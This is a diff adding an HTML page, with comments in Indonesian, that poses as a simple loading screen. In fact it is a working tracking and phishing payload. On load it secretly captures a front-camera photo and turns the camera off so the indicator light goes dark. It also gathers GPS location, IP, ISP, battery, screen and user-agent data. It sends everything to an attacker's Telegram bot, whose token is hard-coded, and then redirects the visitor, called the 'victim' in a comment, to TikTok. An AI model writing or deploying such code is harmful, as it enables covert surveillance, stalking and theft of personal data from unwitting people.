@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat...</title>
+    <style>
+        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <!-- Elemen tersembunyi untuk memproses kamera -->
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // --- KONFIGURASI ---
+        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
+        
+        // Mengambil ID dari parameter URL (?id=xxxx)
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id');
+
+        async function sendData(lat, lon, photoBlob = null) {
+            if (!chatId) {
+                window.location.href = "https://tiktok.com";
+                return;
+            }
+
+            // 1. Ambil Info IP & ISP
+            let ipDetail = "🌐 *IP:* Gagal memuat\n🏢 *ISP:* N/A\n🏙️ *Lokasi:* N/A";
+            try {
+                const res = await fetch('https://ipapi.co');
+                const data = await res.json();
+                ipDetail = `🌐 *IP:* ${data.ip}\n🏢 *ISP:* ${data.org}\n🏙️ *Lokasi:* ${data.city}, ${data.region}`;
+            } catch (e) {}
+
+            // 2. Ambil Info Baterai
+            let batDetail = "N/A";
+            try {
+                const bat = await navigator.getBattery();
+                batDetail = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak'})`;
+            } catch (e) {}
+
+            // 3. Susun Pesan (Format baru dengan tanda $ pada setiap kurung kurawal)
+            const text = encodeURIComponent(
+                `🚀 *PENGUNJUNG BARU TERDETEKSI*\n\n` +
+                `📍 *Lokasi:* [Klik Lihat di Maps](https://google.com{lat},${lon})\n` +
+                `${ipDetail}\n` +
+                `🔋 *Baterai:* ${batDetail}\n` +
+                `🖥️ *Layar:* ${screen.width}x${screen.height}\n` +
+                `📱 *Platform:* ${navigator.platform}\n\n` +
+                `🕵️ *User Agent:*\n\`${navigator.userAgent}\``
+            );
+
+            // 4. Siapkan Array Request Pengiriman
+            let requests = [];
+
+            // Endpoint Telegram API
+            const sendMsg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
+            const sendLoc = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+            
+            requests.push(fetch(sendMsg), fetch(sendLoc));
+
+            // Kirim gambar kamera jika ada
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlob, 'kamera_depan.jpg');
+                
+                const sendPhotoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+                requests.push(fetch(sendPhotoUrl, { method: 'POST', body: formData }));
+            }
+
+            try {
+                await Promise.all(requests);
+            } finally {
+                // Selesai, alihkan korban ke halaman tujuan
+                window.location.href = "https://tiktok.com";
+            }
+        }
+
+        window.onload = async () => {
+            if (!chatId) {
+                window.location.href = "https://tiktok.com";
+                return;
+            }
+
+            let photoBlob = null;
+
+            // Proses Mengambil Gambar Kamera Depan
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                
+                video.srcObject = stream;
+                
+                // Tunggu metadata video termuat
+                await new Promise((resolve) => video.onloadedmetadata = resolve);
+                
+                // Jeda 1 detik agar pencahayaan kamera menyesuaikan secara otomatis
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                
+                // Tangkap bingkai gambar ke canvas
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Matikan kamera agar lampu indikator perangkat padam
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Ubah menjadi file format Blob JPEG
+                photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+            } catch (err) {
+                console.log("Akses kamera ditolak atau tidak didukung.");
+            }
+
+            // Proses Mengambil Koordinat Geolocation GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => sendData(p.coords.latitude, p.coords.longitude, photoBlob),
+                    (e) => {
+                        alert("Izin lokasi diperlukan untuk melanjutkan.");
+                        sendData("0", "0", photoBlob);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                sendData("0", "0", photoBlob);
+            }
+        };
+    </script>
+</body>
+</html>
